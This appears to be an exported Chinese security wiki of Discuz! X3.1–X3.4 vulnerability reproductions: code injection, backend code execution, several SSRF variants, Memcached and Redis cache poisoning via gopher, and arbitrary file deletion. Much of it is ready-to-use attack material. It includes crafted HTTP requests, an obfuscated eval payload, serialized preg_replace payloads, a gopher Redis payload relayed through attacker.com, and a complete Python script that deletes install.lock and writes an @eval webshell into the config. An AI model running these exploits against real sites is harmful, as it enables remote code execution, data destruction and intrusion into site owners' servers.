$return .= \"\\r\\n// $newline //\\r\\n\"; } 本意是使用$config数组的key作为每一块配置区域的\\\"注释标题\\\"，写入配置文件的$newline依赖于$key，而$key是攻击者可控的。 未对输入数据进行正确的边界处理，导致可以插入换行符，逃离注释的作用范围，从而使输入数据转化为可执行代码。 漏洞复现 在产品升级/转换->选择产品转换程序 ->设置服务器信息 这里抓包， payload： POST /dz/utility/convert/index.php HTTP/1.1 Host: www.0-sec.org:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 278 Origin: http://127.0.0.1:8001 Connection: close Referer: http://127.0.0.1:8001/dz/utility/convert/index.php Upgrade-Insecure-Requests: 1 a=config&source=d7.2_x1.5&submit=yes&newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(108).CHR(97).CHR(110).CHR(118).CHR(110).CHR(97).CHR(108).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa 参考链接 https://xz.aliyun.com/t/7492\\#toc-18 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:36 "},"Web安全/Discuz/Discuz! X3.1 后台任意代码执行漏洞/Discuz! X3.1 后台任意代码执行漏洞.html":{"url":"Web安全/Discuz/Discuz! X3.1 后台任意代码执行漏洞/Discuz! X3.1 后台任意代码执行漏洞.html","title":"Discuz! X3.1 后台任意代码执行漏洞","keywords":"","body":"Discuz! X3.1 后台任意代码执行漏洞 一、漏洞简介 二、漏洞影响 Discuz! X3.1 三、复现过程 全局--〉网站第三方统计代码--〉插入php代码[其他地方\\<>会被转意]： 如插入 007uCUf6ly1fxlneom4cfj30om0l40vg.jpg 工具--〉更新缓存[为了保险起见，更新下系统缓存]： 2.jpg 门户--> HTML管理--〉设置： 1） 静态文件扩展名[一定要设置成htm] ：htm2) 专题HTML存放目录: template/default/portal3) 设置完，提交吧！ 3.jpg 门户--〉专题管理--〉创建专题： 1）专题标题：xyz // 这个随便你写了2）静态化名称：portal_topic_222 //222为自定义文件名，自己要记住3）附加内容：选择上： 站点尾部信息 4.jpg 提交 回到门户--〉专题管理,把刚才创建的专题开启，如下图 ： 5.jpg 把刚才的专题，生成 6.jpg 下面就是关键了，现在到了包含文件的时候了。 再新建一个专题： 1）专题标题，静态化名称，这2个随便写2）模板名：这个要选择我们刚才生成的页面：./template/default/portal/portal_topic_222.htm 7.jpg 然后提交，就执行了 8.jpg Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:14 "},"Web安全/Discuz/Discuz! X3.4 imgcropper ssrf/Discuz! X3.4 imgcropper ssrf.html":{"url":"Web安全/Discuz/Discuz! X3.4 imgcropper ssrf/Discuz! X3.4 imgcropper ssrf.html","title":"Discuz! X3.4 imgcropper ssrf","keywords":"","body":"Discuz! X3.4 imgcropper ssrf 一、漏洞简介 对 PHP、curl 版本都有特殊的要求，而且要服务端环境接受空 Host 的请求，总的来说比较鸡肋 二、漏洞影响 三、复现过程 source/class/class_image.php image类init方法： function init($method, $source, $target, $nosuffix = 0) { global $_G; $this->errorcode = 0; if(empty($source)) { return -2; } $parse = parse_url($source); if(isset($parse['host'])) { if(empty($target)) { return -2; } $data = dfsockopen($source); $this->tmpfile = $source = tempnam($_G['setting']['attachdir'].'./temp/', 'tmpimg_'); if(!$data || $source === FALSE) { return -2; } file_put_contents($source, $data); } ...... } 再找哪些地方调用了image类的init方法，发现image类的Thumb、Cropper、Watermark方法都调用了init。比如Thumb： function Thumb($source, $target, $thumbwidth, $thumbheight, $thumbtype = 1, $nosuffix = 0) { $return = $this->init('thumb', $source, $target, $nosuffix); ...... } 所以再找哪些地方调用了image类的Thumb方法，最终发现： source/module/misc/misc_imgcropper.php 52-57行： require_once libfile('class/image'); $image = new image(); $prefix = $_GET['picflag'] == 2 ? $_G['setting']['ftp']['attachurl'] : $_G['setting']['attachurl']; if(!$image->Thumb($prefix.$_GET['cutimg'], $cropfile, $picwidth, $picheight)) { showmessage('imagepreview_errorcode_'.$image->errorcode, null, null, array('showdialog' => true, 'closetime' => true)); } 下断点调试发现 $_G['setting']['ftp']['attachurl'] 的值为 /，而 $_G['setting']['attachurl'] 的值是 data/attachment/。所以似乎 $prefix 为 / 才有 SSRF 利用的可能。 一开始构造 cutimg=/10.0.1.1/get，这样 $url 的值就为 //10.0.1.1/get，按道理来说这应该算是一个正常的 url，但是结果却请求失败了。 仔细跟进 _dfsockopen 发现，在 PHP 环境安装有 cURL 时，进入 curl 处理的代码分支，直到这里： curl_setopt($ch, CURLOPT_URL, $scheme.'://'.($ip ? $ip : $host).($port ? ':'.$port : '').$path); $scheme、$host、$port、$path 都是 parse_url 解析 url 参数后的对应的值，而对像 //10.0.1.1/get 这样的 url 解析时，$scheme 的值是 null，因此最后拼接的结果是 ://10.0.1.1/get，没有协议，curl 最后对这种url的请求会自动在前面加上 HTTP://，结果就变成了请求 HTTP://://10.0.1.1/get，这种 url 在我的环境中会导致 curl 报错。 所以我去掉了 curl 扩展，让 _dfsockopen 函数代码走 socket 发包的流程，踩了 parse_url 和 Dz 代码的一些坑点（这里就不展开了，有兴趣的同学调下代码就知道了），最后发现像这样构造可以成功： cutimg=/:@localhost:9090/dz-imgcropper-ssrf poc: POST /misc.php?mod=imgcropper&picflag=2&cutimg=/:@localhost:9090/dz-imgcropper-ssrf HTTP/1.1 Host: ubuntu-trusty.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Cookie: xkmD_2132_sid=E5sbVr; xkmD_2132_saltkey=m6Y8022s; xkmD_2132_lastvisit=1521612483; xkmD_2132_lastact=1521624907%09misc.php%09imgcropper; xkmD_2132_home_readfeed=1521616105; xkmD_2132_seccode=1.ecda87c571707d3f92; xkmD_2132_ulastactivity=a0f4A9CWpermv2t0GGOrf8%2BzCf6dZyAoQ3Sto7ORINqJeK4g3xcX; xkmD_2132_auth=40a4BIESn2PZVmGftNQ2%2BD1ImxpYr0HXke37YiChA2ruG6OryhLe0bUg53XKlioysCePIZGEO1jmlB1L4qbo; XG8F_2132_sid=fKyQMr; XG8F_2132_saltkey=U7lxxLwx; XG8F_2132_lastvisit=1521683793; XG8F_2132_lastact=1521699709%09index.php%09; XG8F_2132_ulastactivity=200fir8BflS1t8ODAa3R7YNsZTQ1k262ysLbc9wdHRzbPnMZ%2BOv7; XG8F_2132_auth=3711UP00sKWDx2Vo1DtO17C%2FvDfrelGOrwhtDmwu5vBjiXSHuPaFVJ%2FC%2BQi1mw4v4pJ66jx6otRFKfU03cBy; XG8F_2132_lip=172.16.99.1%2C1521688203; XG8F_2132_nofavfid=1; XG8F_2132_onlineusernum=3; XG8F_2132_sendmail=1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 36 imgcroppersubmit=1&formhash=f8472648 此时 url 即为//:@localhost:9090/dz-imgcropper-ssrf。SSRF 请求成功： 通过这种方式进行构造利用的话，不太需要额外的限制条件（只要求服务端 PHP 环境没有安装 curl 扩展）￼，但是只能发 HTTP GET 请求，并且服务端不跟随跳转。漏洞危害有限。 后来 l3m0n 师傅也独立发现了这个漏洞，并且他发现较高版本的 curl 是可以成功请求 HTTP://:/ 的，较高版本的 curl 会将这种 url 地址解析到 127.0.0.1 的 80 端口： 最后他再利用之前 PHP parse_url 的解析 bug（ https://bugs.php.net/bug.php?id=73192 ），及利用 parse_url 和 curl 对 url 的解析差异，成功进行 302 跳转到任意恶意地址，最后再 302 跳转到 gopher 就做到发送任意数据包。详情可以参考 l3m0n 的博客： Discuz x3.4前台SSRF - l3m0n - 博客园 但是这种利用方式对 PHP、curl 版本都有特殊的要求，而且要服务端环境接受空 Host 的请求。总的来说，imgcropper SSRF 仍然比较鸡肋。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:14 "},"Web安全/Discuz/Discuz! X3.4 Memcached未授权访问导致的rce/Discuz! X3.4 Memcached未授权访问导致的rce.html":{"url":"Web安全/Discuz/Discuz! X3.4 Memcached未授权访问导致的rce/Discuz! X3.4 Memcached未授权访问导致的rce.html","title":"Discuz! X3.4 Memcached未授权访问导致的rce","keywords":"","body":"Discuz! X3.4 Memcached未授权访问导致的rce 一、漏洞简介 这个漏洞大致利用过程是这样的：利用discuz!的ssrf漏洞，利用gopher协议写入payload到memcached，然后请求特定链接导致代码执行漏洞。 二、漏洞影响 \\ windows php>5.3+php-curl\\ DZ开放在80端口 三、复现过程 漏洞分析 Dz 整合 Memcache 配置成功后，默认情况下网站首页右下角会出现MemCache On的标志： 漏洞利用有两个版本，一个是老版本，一个是新版本，discuz！虽然已经是x3.4，代码也发生了变化，漏洞确是任然没有修复。 漏洞利用代码流程逻辑： 访问： forum.php?mod=ajax&inajax=yes&action=getthreadtypes ./source/module/forum/forum_ajax.php ./template/default/common/footer_ajax.htm ./source/function/function_core.php ./source/function/function_core.php 最后利用preg_replace函数/e参数的代码执行特性完成了漏洞利用的全部过程。 以上是老版本代码，在网上已经有一些分析了，在这里简述一些，重点是payload的完整性使用。网上文章大部分在payload部分都只是验证性演示。作为一名红队渗透测试人员，验证性payload肯定是不能再实际渗透测试活动中使用的。 漏洞复现 1 老版本漏洞利用流程： 生成payload ');\"; $payload['rewritestatus']['plugins']= 1; echoserialize($payload); a:2:{s:6:\"output\";a:1:{s:4:\"preg\";a:2:{s:6:\"search\";a:1:{s:7:\"plugins\";s:5:\"/.*/e\";}s:7:\"replace\";a:1:{s:7:\"plugins\";s:68:\"file_put_contents('./data/cache/ln.php','');\";}}}s:13:\"rewritestatus\";a:1:{s:7:\"plugins\";i:1;}} 然后telnet链接memcached telnet 1.1.1.1 11211 set xxxxxx_setting 1 0 yyy //xxxx为前缀，discuz定义的，可以使用stats cachedump 命令查看。yyy为payload长度。 最后访问forum.php?mod=ajax&inajax=yes&action=getthreadtypes shell生成**/data/cache/ln.php** 2 新版本漏洞利用流程 生成payload有点变化(ps:只是少了一个e) ');\"; $payload['rewritestatus']['plugins']= 1; echoserialize($payload); a:2:{s:6:\"output\";a:1:{s:4:\"preg\";a:2:{s:6:\"search\";a:1:{s:7:\"plugins\";s:4:\"/.*/\";}s:7:\"replace\";a:1:{s:7:\"plugins\";s:68:\"file_put_contents('./data/cache/ln.php','');\";}}}s:13:\"rewritestatus\";a:1:{s:7:\"plugins\";i:1;}} 访问:forum.php?mod=ajax&inajax=yes&action=getthreadtypes 最后一定要恢复缓存 Delete Vtfbsm_setting 成功写入文件 参考链接 https://xz.aliyun.com/t/2018 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:16 "},"Web安全/Discuz/Discuz! X3.4 ssrf 攻击redis/Discuz! X3.4 ssrf 攻击redis.html":{"url":"Web安全/Discuz/Discuz! X3.4 ssrf 攻击redis/Discuz! X3.4 ssrf 攻击redis.html","title":"Discuz! X3.4 ssrf 攻击redis","keywords":"","body":"Discuz! X3.4 ssrf 攻击redis 一、漏洞简介 需要得到authkey 二、漏洞影响 Discuz x3.4 三、复现过程 类似地，Dz 整合 Redis 配置成功后，默认情况下网站首页右下角会出现Redis On的标志： SSRF 攻击 Redis 步骤实际上就比攻击 Memcache 简单了，因为 Redis 支持 lua 脚本，可以直接用 lua 脚本获取缓存键名而无需再去猜解前缀。当然能成功攻击的前提是 Redis 没有配置密码认证，Discuz requirepass 那一项为空： Redis 交互命令行执行 lua 脚本： eval \"local t=redis.call('keys','*_setting'); for i,v in ipairs(t) do redis.call('set', v, 'a:2:{s:6:\\\"output\\\";a:1:{s:4:\\\"preg\\\";a:2:{s:6:\\\"search\\\";a:1:{s:7:\\\"plugins\\\";s:4:\\\"/.*/\\\";}s:7:\\\"replace\\\";a:1:{s:7:\\\"plugins\\\";s:9:\\\"phpinfo()\\\";}}}s:13:\\\"rewritestatus\\\";i:1;}') end; return 1;\" 0 同样地，对这个过程抓包，将数据包改成 gopher 的形式： gopher://localhost:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24264%0d%0alocal%20t%3Dredis.call('keys'%2C'*_setting')%3B%20for%20i%2Cv%20in%20ipairs(t)%20do%20redis.call('set'%2C%20v%2C%20'a%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D')%20end%3B%20return%201%3B%0d%0a%241%0d%0a0%0d%0a SSRF 利用： http://target/plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjYzNzkvXyozJTBkJTBhJTI0NCUwZCUwYWV2YWwlMGQlMGElMjQyNjQlMGQlMGFsb2NhbCUyMHQlM0RyZWRpcy5jYWxsKCdrZXlzJyUyQycqX3NldHRpbmcnKSUzQiUyMGZvciUyMGklMkN2JTIwaW4lMjBpcGFpcnModCklMjBkbyUyMHJlZGlzLmNhbGwoJ3NldCclMkMlMjB2JTJDJTIwJ2ElM0EyJTNBJTdCcyUzQTYlM0ElMjJvdXRwdXQlMjIlM0JhJTNBMSUzQSU3QnMlM0E0JTNBJTIycHJlZyUyMiUzQmElM0EyJTNBJTdCcyUzQTYlM0ElMjJzZWFyY2glMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E0JTNBJTIyJTJGLiolMkYlMjIlM0IlN0RzJTNBNyUzQSUyMnJlcGxhY2UlMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E5JTNBJTIycGhwaW5mbygpJTIyJTNCJTdEJTdEJTdEcyUzQTEzJTNBJTIycmV3cml0ZXN0YXR1cyUyMiUzQmklM0ExJTNCJTdEJyklMjBlbmQlM0IlMjByZXR1cm4lMjAxJTNCJTBkJTBhJTI0MSUwZCUwYTAlMGQlMGE%253D&wxopenid=xxxyyyzzz 代码即再次执行成功。 参考链接 https://zhuanlan.zhihu.com/p/51907363 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:18 "},"Web安全/Discuz/Discuz! X3.4 Weixin Plugin ssrf/Discuz! X3.4 Weixin Plugin ssrf.html":{"url":"Web安全/Discuz/Discuz! X3.4 Weixin Plugin ssrf/Discuz! X3.4 Weixin Plugin ssrf.html","title":"Discuz! X3.4 Weixin Plugin ssrf","keywords":"","body":"Discuz! X3.4 Weixin Plugin ssrf 一、漏洞简介 二、漏洞影响 Discuz! X3.4 三、复现过程 source/plugin/wechat/wechat.class.php WeChat类syncAvatar方法： static public function syncAvatar($uid, $avatar) { if(!$uid || !$avatar) { return false; } if(!$content = dfsockopen($avatar)) { return false; } $tmpFile = DISCUZ_ROOT.'./data/avatar/'.TIMESTAMP.random(6); file_put_contents($tmpFile, $content); if(!is_file($tmpFile)) { return false; } $result = uploadUcAvatar::upload($uid, $tmpFile); unlink($tmpFile); C::t('common_member')->update($uid, array('avatarstatus'=>'1')); return $result; } source/plugin/wechat/wechat.inc.php 中调用了WeChat::syncAvatar，直接用$_GET['avatar']作为参数传进去： ...... elseif(($ac == 'register' && submitcheck('submit') || $ac == 'wxregister') && $_G['wechat']['setting']['wechat_allowregister']) { ...... $uid = WeChat::register($_GET['username'], $ac == 'wxregister'); if($uid && $_GET['avatar']) { WeChat::syncAvatar($uid, $_GET['avatar']); } } 不过因为这里用到了微信登录的插件，所以要利用的话需要目标站开启微信登录： 这里 SSRF 的构造很简单，直接在avatar参数构造 url 即可（只是注意wxopenid参数每次请求都要足够随机保证没有重复，如果重复的话代码是无法走到发起请求的逻辑的）： poc http://target/plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=http://localhost:9090/dz-weixin-plugin-ssrf&wxopenid=dont_be_evil Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:19 "},"Web安全/Discuz/Discuz! X3.4 任意文件删除漏洞/Discuz! X3.4 任意文件删除漏洞.html":{"url":"Web安全/Discuz/Discuz! X3.4 任意文件删除漏洞/Discuz! X3.4 任意文件删除漏洞.html","title":"Discuz! X3.4 任意文件删除漏洞","keywords":"","body":"Discuz! X3.4 任意文件删除漏洞 一、漏洞简介 二、漏洞影响 影响版本：Discuz!x ≤3.4 三、复现过程 漏洞分析 Discuz!X的码云已经更新修复了该漏洞 https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574 核心问题在upload/source/include/spacecp/spacecp_profile.php 跟入代码70行 if(submitcheck('profilesubmit')) { 当提交profilesubmit时进入判断，跟入177行 我们发现如果满足配置文件中某个formtype的类型为file，我们就可以进入判断逻辑，这里我们尝试把配置输出出来看看 我们发现formtype字段和条件不符，这里代码的逻辑已经走不进去了 我们接着看这次修复的改动，可以发现228行再次引入语句unlink @unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]); 回溯进入条件 当上传文件并上传成功，即可进入unlink语句 然后回溯变量$space[$key],不难发现这就是用户的个人设置。 只要找到一个可以控制的变量即可，这里选择了birthprovince。 在设置页面直接提交就可以绕过字段内容的限制了。 成功实现了任意文件删除 漏洞复现 访问http://your-ip/robots.txt可见robots.txt是存在的： 注册用户后，在个人设置页面找到自己的formhash： 带上自己的Cookie、formhash发送如下数据包： POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1 Host: localhost Content-Length: 367 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,en;q=0.6 Cookie: [your cookie] Connection: close ------WebKitFormBoundaryPFvXyxL45f34L12s Content-Disposition: form-data; name=\"formhash\" [your formhash] ------WebKitFormBoundaryPFvXyxL45f34L12s Content-Disposition: form-data; name=\"birthprovince\" ../../../robots.txt ------WebKitFormBoundaryPFvXyxL45f34L12s Content-Disposition: form-data; name=\"profilesubmit\" 1 ------WebKitFormBoundaryPFvXyxL45f34L12s-- 提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态： 说明我们的脏数据已经进入数据库了。 然后，新建一个upload.html，代码如下，将其中的[your-ip]改成discuz的域名，[form-hash]改成你的formhash： 用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。 再次访问http://your-ip/robots.txt，发现文件成功被删除： Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:20 "},"Web安全/Discuz/Discuz! X3.4 任意文件删除配合install过程getshell/Discuz! X3.4 任意文件删除配合install过程getshell.html":{"url":"Web安全/Discuz/Discuz! X3.4 任意文件删除配合install过程getshell/Discuz! X3.4 任意文件删除配合install过程getshell.html","title":"Discuz! X3.4 任意文件删除配合install过程getshell","keywords":"","body":"Discuz! X3.4 任意文件删除配合install过程getshell 一、漏洞简介 **可以利用的条件：**1、安装后没有登录后台，此时install/index还没删除 2、因为其他原因没有删除 二、漏洞影响 Discuz! X3.4 三、复现过程 漏洞分析 这个方法是看到一篇博客分析的，主要是利用文件删除漏洞删掉install.lock文件，绕过对安装完成的判断能够再进行安装的过程，然后再填写配置信息处构使用构造的表前缀名，时一句话写入配置文件中，getshell。 表前缀：x');@eval($_POST[lanvnal]);(' 但是我在使用上面版本v3.4的代码时发现，安装后install目录下不存在index.php了。分析代码发现会有安装后的删除处理，在/source/admincp/admincp_index.php的第14行： if(@file_exists(DISCUZ_ROOT.'./install/index.php') && !DISCUZ_DEBUG) { @unlink(DISCUZ_ROOT.'./install/index.php'); if(@file_exists(DISCUZ_ROOT.'./install/index.php')) { dexit('Please delete install/index.php via FTP!'); } } 那是不是老版本存在该问题呢？ 我翻了历史版本代码，直到git提交的第一个版本都有如上的处理。 但还是分析一下吧，就当学习了。 **可以利用的条件：**1、安装后没有登录后台，此时install/index还没删除 2、因为其他原因没有删除 分析一下安装逻辑，install/index.php文件的整体流程如下： 分别是我们安装的每一步，接受协议->环境检测->是否安装 UCenter Server->数据库配置信息->安装过程，生成lock文件->检查 问题出在在 db_init 的处理中，在代码第369行： if(DZUCFULL) { install_uc_server(); } 跟进install_uc_server，在1296行可以发现对config参数没做任何过滤传入到save_uc_config中： save_uc_config($config, ROOT_PATH.'./config/config_ucenter.php'); 然后save_uc_config也没做任何安全处理，就拼接参数后写入文件： function save_uc_config($config, $file) { $success = false; list($appauthkey, $appid, $ucdbhost, $ucdbname, $ucdbuser, $ucdbpw, $ucdbcharset, $uctablepre, $uccharset, $ucapi, $ucip) = $config; $link = function_exists('mysql_connect') ? mysql_connect($ucdbhost, $ucdbuser, $ucdbpw, 1) : new mysqli($ucdbhost, $ucdbuser, $ucdbpw, $ucdbname); $uc_connnect = $link ? 'mysql' : ''; $date = gmdate(\"Y-m-d H:i:s\", time() + 3600 * 8); $year = date('Y'); $config = EOT; if($fp = fopen($file, 'w')) { fwrite($fp, $config); fclose($fp); $success = true; } return $success; } 因为 dbhost, dbuser等参数需要用来连接数据库，所以利用 tablepre 向配置文件写入shell。 漏洞复现 如果安装后install/index.php因为某些原因还存在，直接访问会有如下警告： 通过文件删除漏洞删除data目录下的install.lock文件就可以重新安装。 安装过程修改表前缀内容为：x');@eval($_POST[lanvnal]);(' 在config/config_ucenter.php中已经写入了webshell。 poc #!/usr/bin/env python3 import base64 import random import re import string import requests sess = requests.Session() randstr = lambda len=5: ''.join(random.choice(string.ascii_lowercase) for _ in range(len)) ################################################## ########## Customize these parameters ############ target = 'http://localhost/discuzx' # login target site first, and copy the cookie here cookie = \"UM_distinctid=15bcd2339e93d6-07b5ae8b41447e-8373f6a-13c680-15bcd2339ea636; CNZZDATA1261218610=1456502094-1493792949-%7C1494255360; csrftoken=NotKIwodOQHO0gdMyCAxpMuObjs5RGdeEVxRlaGoRdOEeMSVRL0sfeTBqnlMjtlZ; Zy4Q_2132_saltkey=I9b3k299; Zy4Q_2132_lastvisit=1506763258; Zy4Q_2132_ulastactivity=0adb6Y1baPukQGRVYtBOZB3wmx4nVBRonRprfYWTiUaEbYlKzFWL; Zy4Q_2132_nofavfid=1; Zy4Q_2132_sid=rsQrgQ; Zy4Q_2132_lastact=1506787935%09home.php%09misc; 7Csx_2132_saltkey=U8nrO8Xr; TMT0_2132_saltkey=E3q5BpyX; PXMk_2132_saltkey=rGBnNWu7; b4Gi_2132_saltkey=adC4r05k; b4Gi_2132_lastvisit=1506796139; b4Gi_2132_onlineusernum=2; b4Gi_2132_sendmail=1; b4Gi_2132_seccode=1.8dab0a0c4ebfda651b; b4Gi_2132_sid=BywqMy; b4Gi_2132_ulastactivity=51c0lBFHqkUpD3mClFKDxwP%2BI0JGaY88XWTT1qtFBD6jAJUMphOL; b4Gi_2132_auth=6ebc2wCixg7l%2F6No7r54FCvtNKfp1e5%2FAdz2SlLqJRBimNpgrbxhSEnsH5%2BgP2mAvwVxOdrrpVVX3W5PqDhf; b4Gi_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; b4Gi_2132_creditbase=0D0D0D0D0D0D0D0D0; b4Gi_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; b4Gi_2132_lastcheckfeed=1%7C1506800134; b4Gi_2132_checkfollow=1; b4Gi_2132_lastact=1506800134%09misc.php%09seccode\" shell_password = randstr() db_host = '' db_user = '' db_pw = '' db_name = '' ################################################# path = '/home.php?mod=spacecp&ac=profile&op=base' url = target + path sess.headers.update({ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer': url}) # sess.proxies.update({'http': 'socks5://localhost:1080'}) # sess.proxies.update({'http': 'http://localhost:8080'}) def login(username=None, password=None): sess.headers.update({'Cookie': cookie}) def get_form_hash(): r = sess.get(url) match = re.search(r'\"member.php\\?mod=logging&action=logout&formhash=(.*?)\"', r.text, re.I) if match: return match.group(1) def tamper(formhash, file_to_delete): data = { 'formhash': (None, formhash), 'profilesubmit': (None, 'true'), 'birthprovince': (None, file_to_delete) } r = sess.post(url, files=data) if 'parent.show_success' in r.text: print('tamperred successfully') return True def delete(formhash, file): if not tamper(formhash, file): return False image = b'iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg==' data = { 'formhash': formhash, 'profilesubmit': 'true' } files = { 'birthprovince': ('image.png', base64.b64decode(image), 'image/png') } r = sess.post(url, data=data, files=files) if 'parent.show_success' in r.text: print('delete {} successfully'.format(file)) return True def getshell(): install_url = target + '/install/index.php' r = sess.get(install_url) if '安装向导' not in r.text: print('install directory not exists') return False table_prefix = \"x');@eval($_POST[{}]);('\".format(shell_password) data = { 'step': 3, 'install_ucenter': 'yes', 'dbinfo[dbhost]': db_host, 'dbinfo[dbname]': db_name, 'dbinfo[dbuser]': db_user, 'dbinfo[dbpw]': db_pw, 'dbinfo[tablepre]': table_prefix, 'dbinfo[adminemail]': 'admin@admin.com', 'admininfo[username]': 'admin', 'admininfo[password]': 'admin', 'admininfo[password2]': 'admin', 'admininfo[email]': 'admin@admin.com', } r = sess.post(install_url, data=data) if '建立数据表 CREATE TABLE' not in r.text: print('write shell failed') return False print('shell: {}/config/config_ucenter.php'.format(target)) print('password: {}'.format(shell_password)) if __name__ == '__main__': login() form_hash = get_form_hash() if form_hash: delete(form_hash, '../../../data/install.lock') getshell() else: print('failed') 参考链接 https://xz.aliyun.com/t/7492\\#toc-7 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:23 "},"Web安全/Discuz/Discuz! X3.4 前台ssrf/Discuz! X3.4 前台ssrf.html":{"url":"Web安全/Discuz/Discuz! X3.4 前台ssrf/Discuz! X3.4 前台ssrf.html","title":"Discuz! X3.4 前台ssrf","keywords":"","body":"Discuz! X3.4 前台ssrf 一、漏洞简介 DDiscuz! X3.4 source/module/misc/misc_imgcropper.php页面中的cutimg参数，因为应用程序的远程下载功能过滤不严，配合前台任意URL跳转漏洞，可以造成SSRF漏洞，可以对与外部隔离的内部环境进行探测和攻击 二、漏洞影响 \\ windows php>5.3+php-curl\\ DZ开放在80端口 三、复现过程 漏洞分析 本地ssrf /source/module/misc/misc_imgcropper.php 55行 require_once libfile('class/image'); $image = new image(); $prefix = $_GET['picflag'] == 2 ? $_G['setting']['ftp']['attachurl'] : $_G['setting']['attachurl']; if(!$image->Thumb($prefix.$_GET['cutimg'], $cropfile, $picwidth, $picheight)) { showmessage('imagepreview_errorcode_'.$image->errorcode, null, null, array('showdialog' => true, 'closetime' => true)); } $prefix`可以通过GET传递`$_GET['picflag']`为2进行三元操作，变成了默认的`/`，然后和`$_GET['cutimg']`进行拼接作为第一个参数传进了`$image->Thumb source/class/class_image.php 51行 function Thumb($source, $target, $thumbwidth, $thumbheight, $thumbtype = 1, $nosuffix = 0) { $return = $this->init('thumb', $source, $target, $nosuffix); } 拼接后的参数作为$source又传进了init函数 source/class/class_image.php 118行 function init($method, $source, $target, $nosuffix = 0) { global $_G; $this->errorcode = 0; if(empty($source)) { return -2; } $parse = parse_url($source); if(isset($parse['host'])) { if(empty($target)) { return -2; } $data = dfsockopen($source); $this->tmpfile = $source = tempnam($_G['setting']['attachdir'].'./temp/', 'tmpimg_'); if(!$data || $source === FALSE) { return -2; } file_put_contents($source, $data); } 可以发现如果$source经过parse_url的解析结果中如果包含host字段就不结束流程，然后将$source参数传入dfsockopen函数。Php中的parse_url函数是可以对//开头的域名进行解析的, $source本身就是/开头，因此只需要通过开始的$_GET['cutimg']注入/www.0-sec.org，变成//www.0-sec.org`即可继续执行。 source/function/function_core.php 199行 function dfsockopen($url, $limit = 0, $post = '', $cookie = '', $bysocket = FALSE, $ip = '', $timeout = 15, $block = TRUE, $encodetype = 'URLENCODE', $allowcurl = TRUE, $position = 0, $files = array()) { require_once libfile('function/filesock'); return _dfsockopen($url, $limit, $post, $cookie, $bysocket, $ip, $timeout, $block, $encodetype, $allowcurl, $position, $files);} 进入dfsockopen函数后，我们构造的字符串变为$url，然后传入了_dfsockopen函数。 dz/source/function/function_filesock.php 31行 image 发起了curl请求，就是这里触发了ssrf，这里的现有使用后parse_url解析了一次$url，和上面的解析是一样的，然后又进行了拼接成为了curl的地址。 其$scheme为空，如果我们为cutimg传入/dz//member.php，那么到就会变成://dz//member.php 在php的curl中我们尝试访问://dz/forum.php 